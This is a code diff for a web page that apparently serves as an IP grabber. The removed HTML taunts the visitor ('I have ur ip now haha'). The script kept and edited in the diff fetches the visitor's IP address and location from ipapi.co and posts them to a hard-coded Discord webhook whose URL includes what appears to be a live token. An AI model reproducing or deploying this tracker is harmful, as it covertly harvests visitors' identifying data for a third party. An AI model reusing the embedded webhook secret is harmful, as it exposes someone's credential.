@@ -1,24 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>hi :)</title>
-  <style>
-    body {
-      background: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 20%;
-      font-size: 2rem;
-    }
-  </style>
-</head>
-<body>
-
-  hi :)<br>
-  I have ur ip now haha 
-
 <script>
   const webhookUrl = "https://discord.com/api/webhooks/1446998835229626412/aL3byydfp-9STVBzdf8SMsAiTASlJFHxQrjts7rttPgGlhcCvNE1adAd2ESDJd5qdS4B";
 
@@ -51,6 +30,8 @@
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
+      const ip = String(data.ip || "Unknown"); // force raw string format
+
       const payload = {
         content: "🌐 New visitor!",
         embeds: [
@@ -58,7 +39,7 @@
             title: "Visitor Details",
             color: 5814783,
             fields: [
-              { name: "IP Address", value: data.ip || "Unknown" },
+              { name: "IP Address", value: ip },                  // full raw IP
               { name: "Country", value: data.country_name || "Unknown", inline: true },
               { name: "Region", value: data.region || "Unknown", inline: true },
               { name: "City", value: data.city || "Unknown", inline: true },
@@ -79,6 +60,3 @@
     })
     .catch(err => console.error("Error:", err));
 </script>
-
-</body>
-</html>
